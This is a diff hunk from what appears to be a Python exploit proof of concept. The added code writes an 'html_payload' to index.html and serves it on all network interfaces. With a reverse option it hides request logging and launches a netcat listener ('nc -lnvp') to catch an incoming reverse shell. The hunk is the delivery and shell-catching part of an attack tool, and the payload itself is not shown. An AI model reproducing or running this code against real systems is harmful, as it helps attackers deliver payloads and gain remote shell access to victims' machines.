@@ -121,6 +121,47 @@ def main(args):
     )  
 
 
+# Create our HTML endpoint
+    with open(os.path.join(serve_path, "index.html"), "w") as filp:
+        filp.write(html_payload)
+
+    class ReuseTCPServer(socketserver.TCPServer):
+        def server_bind(self):
+            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.socket.bind(self.server_address)
+
+    class Handler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory=serve_path, **kwargs)
+
+        def log_message(self, format, *func_args):
+            if args.reverse:
+                return
+            else:
+                super().log_message(format, *func_args)
+
+        def log_request(self, format, *func_args):
+            if args.reverse:
+                return
+            else:
+                super().log_request(format, *func_args)
+
+    def serve_http():
+        with ReuseTCPServer(("", args.port), Handler) as httpd:
+            httpd.serve_forever()
+
+    # Host the HTTP server on all interfaces
+    print(f"[+] serving html payload on :{args.port}")
+    if args.reverse:
+        t = threading.Thread(target=serve_http, args=())
+        t.start()
+        print(f"[+] starting 'nc -lvnp {args.reverse}' ")
+        os.system(f"nc -lnvp {args.reverse}")
+
+    else:
+        serve_http()
+
+
 if __name__ == "__main__":
 
     main(parser.parse_args())
